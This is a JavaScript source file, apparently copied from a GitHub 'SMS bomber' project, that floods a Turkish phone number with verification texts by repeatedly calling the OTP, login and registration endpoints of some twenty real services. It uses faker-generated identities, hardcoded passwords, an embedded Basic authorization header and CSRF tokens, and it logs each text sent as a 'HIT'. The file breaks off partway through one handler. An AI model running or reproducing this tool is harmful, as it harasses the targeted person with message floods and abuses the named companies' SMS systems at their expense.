/*

https://github.com/egehan0250/Sms_Bomber_Api/blob/main/functions/sms.js adresinden alınmıştır.

*/


async function delaySystem(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function smsBomber(phone, amount) {
    let systemFinishedT = false;
    console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] `) + 
               chalk.red("🎯 [BOMBER]") + 
               chalk.yellow(` Deploying ${amount} SMS bombs to target: +90${phone}`));
    
    const queryPromise = new Promise(async (resolve, reject) => {
        try {
            let dataSb = {
                startDate: Date.now(),
                phone: phone,
                amount: amount,
                total: 0,
                success: 0,
                error: 0,
            };

            async function kigili(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://www.kigili.com/users/registration/",
                    form: {
                        first_name: faker.name.firstName(),
                        last_name: faker.name.lastName(),
                        email: faker.internet.email(),
                        phone: "0" + no,
                        password: "nwejkfıower32",
                        confirm: "true",
                        kvkk: "true",
                        next: "",
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 202) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Kigili] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Kigili] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            async function kahvedunyasi(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://core.kahvedunyasi.com/api/users/sms/send",
                    form: {
                        mobile_number: no,
                        token_type: "register_token",
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [KahveDünyası] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [KahveDünyası] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            async function wmf(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://www.wmf.com.tr/users/register/",
                    form: {
                        confirm: "true",
                        date_of_birth: "1956-03-01",
                        email: faker.internet.email(),
                        email_allowed: "true",
                        first_name: faker.name.firstName(),
                        gender: "male",
                        last_name: faker.name.lastName(),
                        password: "nwejkfıower32",
                        phone: "0" + no,
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 202) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [WMF] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [WMF] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            async function tiklagelsin(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request({
                    url: "https://www.tiklagelsin.com/user/graphql",
                    headers: {
                        accept: "*/*",
                        "accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/json",
                        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-device-type": "3",
                        "x-merchant-type": "0",
                        "x-no-auth": "true",
                        Referer: "https://www.tiklagelsin.com/a/",
                        "Referrer-Policy": "strict-origin-when-cross-origin",
                    },
                    body: `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
                    method: "POST",
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [TiklaGelsin] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [TiklaGelsin] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function bim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://bim.veesk.net:443/service/v1.0/account/login',
                    json: {
                        "phone": no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Bim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Bim] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function sok(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.ceptesok.com:443/api/users/sendsms',
                    json: {
                        "mobile_number": no,
                        "token_type": "register_token"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Sok] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Sok] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function migros(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
                    json: {
                        "phoneNumber": no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Migros] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Migros] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function a101(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.a101.com.tr:443/users/otp-login/',
                    json: {
                        "phone": "0"+no,
                        "next": "/a101-kapida"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [A101] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [A101] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function sakasu(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
                    form: {
                        "phone": "0"+no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Sakasu] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Sakasu] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });     
            }
            
            function zarinplus(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.zarinplus.com/user/zarinpal-login',
                    json: {
                        "phone_number": "90"+no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [ZarinPlus] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [ZarinPlus] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function coregap(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://core.gap.im/v1/user/add.json?mobile=90${no}`,
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [CoreGap] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [CoreGap] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function icq(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${no}&platform=ios&r=796356153&smsFormatType=human`,
                    headers: {
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded", 
                        "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", 
                        "Accept-Language": "tr-TR,en;q=0.9", 
                        "Accept-Encoding": "gzip, deflate"
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [ICQ] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [ICQ] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                }
                });
            }

            function naosstars(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://shop.naosstars.com/users/register/`,
                    json: {
                        "email": `${faker.internet.email()}`,
                        "first_name": `${faker.name.firstName()}`,
                        "last_name": `${faker.name.lastName()}`,
                        "password": "nwejkDsOpOJıower32.",
                        "date_of_birth": "1975-12-31",
                        "phone": `0${no}`,
                        "gender": "male",
                        "kvkk": "true",
                        "contact": "true",
                        "confirm": "true"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [NaosStars] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [NaosStars] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function rentiva(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://rentiva.com:443/api/Account/Login`,
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Content-Type": "application/json", 
                        "Origin": "ionic://localhost", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 
                        "Accept-Language": "tr-TR,tr;q=0.9" 
                    },
                    json: {
                        "appleId": null,
                        "code": "", 
                        "email": "", 
                        "facebookId": null,
                        "googleId": null,
                        "lastName": "", 
                        "name": "", 
                        "phone": no,
                        "type": 1
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Rentiva] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Rentiva] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            async function loncamarket(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.loncamarket.com/lid/identity/sendconfirmationcode',
                    json: {
                        "Address": no,
                        "ConfirmationType": 0
                    },
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", 
                        "Accept": "application/json, text/javascript, */*; q=0.01", 
                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", 
                        "Accept-Encoding": "gzip, deflate", "Content-Type": 
                        "application/json; charset=utf-8", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Origin": "https://www.loncamarket.com", 
                        "Dnt": "1", 
                        "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", 
                        "Sec-Fetch-Dest": "empty", 
                        "Sec-Fetch-Mode": "cors", 
                        "Sec-Fetch-Site": "same-origin", 
                        "Te": "trailers", 
                        "Connection": "close"
                    },
                    verify: false,
                    timeout: 3000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [LoncaMarket] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [LoncaMarket] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function kimgb(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp',
                    json: {
                        "msisdn": `90${no}`
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Kimgb] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Kimgb] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function tazi(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin',
                    json: {
                        "cep_tel": no,
                        "cep_tel_ulkekod": "90",
                    },
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Content-Type": "application/json;charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Tazi] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Tazi] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function evidea(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.evidea.com:443/users/register/',
                    data: `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`,
                    headers: {
                        "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", 
                        "X-Project-Name": "undefined", 
                        "Accept": "application/json, text/plain, */*", 
                        "X-App-Type": "akinon-mobile", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Cache-Control": "no-store", 
                        "Accept-Encoding": "gzip, deflate", 
                        "X-App-Device": "ios", 
                        "Referer": "https://www.evidea.com/", 
                        "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", 
                        "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Evidea] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Evidea] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function heyscooter(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${no}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`,
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
                        "Accept-Language": "tr"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [HeyScooter] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [HeyScooter] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.red("❌ FAILED"));
                    }
                });
            }

            function koton(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://www.koton.com:443/users/register/`,
                    headers: {
                        "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", 
                        "X-Project-Name": "rn-env", 
                        "Accept": "application/json, text/plain, */*", 
                        "X-App-Type": "akinon-mobile", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "en-US,en;q=0.9", 
                        "Cache-Control": "no-store", 
                        "Accept-Encoding": "gzip, deflate", 
                        "X-App-Device": "ios", "Referer": "https://www.koton.com/", 
                        "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
                        "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
                    },
                    data: `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`,
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.green("🚀 [HIT]") +
                            chalk.cyan(" [Koton] ") +
                            chalk.white(`Target: +90${no} `) +
                            chalk.green("✅ DEPLOYED"));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
                            chalk.red("💥 [MISS]") +
                            chalk.cyan(" [Koton] ") +
                            chalk.white(`Target: +90${no} `) +
